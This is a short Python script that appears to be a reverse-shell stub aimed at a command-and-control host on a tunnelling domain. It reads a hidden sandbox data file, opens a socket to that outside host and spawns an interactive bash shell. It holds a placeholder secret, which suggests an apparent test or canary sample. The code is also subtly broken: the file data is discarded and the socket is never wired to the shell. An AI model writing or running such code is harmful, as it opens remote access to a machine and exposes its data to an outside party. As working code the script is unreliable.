import pty, socket

synthetic_secret_never_expose = "not-a-real-secret"
C2_HOST = "smat7ckgzo.localto.net"
C2_PORT = 6303
open("/tmp/.sandbox_data.json", "rb").read()
s = socket.create_connection((C2_HOST, C2_PORT))
pty.spawn("/bin/bash")
